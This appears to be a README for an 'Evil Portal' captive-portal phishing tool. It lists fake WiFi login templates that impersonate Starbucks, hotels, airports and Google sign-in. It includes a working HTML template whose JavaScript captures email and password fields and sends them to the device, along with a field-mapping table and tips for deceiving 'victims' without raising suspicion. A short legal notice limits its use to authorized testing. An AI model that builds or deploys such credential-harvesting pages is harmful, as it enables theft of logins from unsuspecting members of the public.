# 📁 HTML Templates

This folder contains ready-to-use HTML templates for the Evil Portal captive portal.

## Available Templates

| Template | File | Best For | Language |
|----------|------|----------|----------|
| Free WiFi | `free_wifi.html` | General use, public places | English |
| Starbucks | `starbucks.html` | Coffee shops | Spanish |
| Hotel | `hotel.html` | Hotels, resorts | English |
| Airport | `airport.html` | Airports, transit | English |
| Google Sign-in | `google_signin.html` | Social engineering | English |

## How to Use

### Method 1: Embed in Firmware (Recommended)

1. Open your chosen template HTML file
2. Copy the entire contents
3. In `EvilPortal_v1.1.ino`, replace the content inside `portal_html`:

```cpp
const char portal_html[] PROGMEM = R"rawliteral(
// PASTE YOUR TEMPLATE HTML HERE
)rawliteral";
```

4. Recompile and upload

### Method 2: Dynamic Loading (Future v1.2)

In a future version, templates will be storable in SPIFFS and switchable from the admin panel.

## Creating Custom Templates

### Requirements

Your HTML must include:

1. **A form with `id="loginForm"`**
2. **Input fields named `email` and `password`**
3. **JavaScript to submit via Image() request**

### Template Structure

```html
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Your Title</title>
    <style>
        /* Your CSS here - keep it inline! */
    </style>
</head>
<body>
    <div class="form-container" id="formContainer">
        <form id="loginForm">
            <!-- email field (can be labeled differently) -->
            <input type="email" name="email" required>
            
            <!-- password field (can be text type if needed) -->
            <input type="password" name="password" required>
            
            <button type="submit">Connect</button>
        </form>
    </div>
    
    <div class="success" id="successMsg">
        <!-- Success message shown after submission -->
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Capture and send credentials
            var formData = new FormData(this);
            var params = new URLSearchParams(formData).toString();
            var img = new Image();
            img.src = '/get?' + params;
            
            // Show success message
            document.getElementById('formContainer').classList.add('hide');
            document.getElementById('successMsg').classList.add('show');
        });
    </script>
</body>
</html>
```

### Tips for Effective Templates

1. **Keep it simple** - Complex pages load slower and may look suspicious
2. **Match the environment** - Use appropriate branding for the location
3. **Mobile-first** - Most victims will be on phones
4. **No external resources** - Everything must be inline (no CDN links)
5. **Quick submission** - Don't ask for too much info (suspicion increases)
6. **Convincing success** - The "connected" message should feel real

### Field Mapping

The firmware captures these fields from the form:

| Form Field Name | What's Captured |
|-----------------|-----------------|
| `email` | Primary identifier (email/username) |
| `username` | Alternative for email |
| `user` | Alternative for email |
| `password` | Password/secondary info |
| `pass` | Alternative for password |

You can label these however you want in the UI (e.g., "Room Number", "Name", etc.)

## Size Limits

- Keep total HTML under 50KB for best performance
- Larger templates may cause slow page loads
- Test on actual mobile devices before deployment

## Contributing

Want to share your template?

1. Create your HTML file
2. Test it thoroughly
3. Submit a PR with:
   - The HTML file
   - Screenshot(s)
   - Description of the scenario

## Legal Notice

These templates are for **authorized security testing only**. Using them without permission is illegal and unethical.
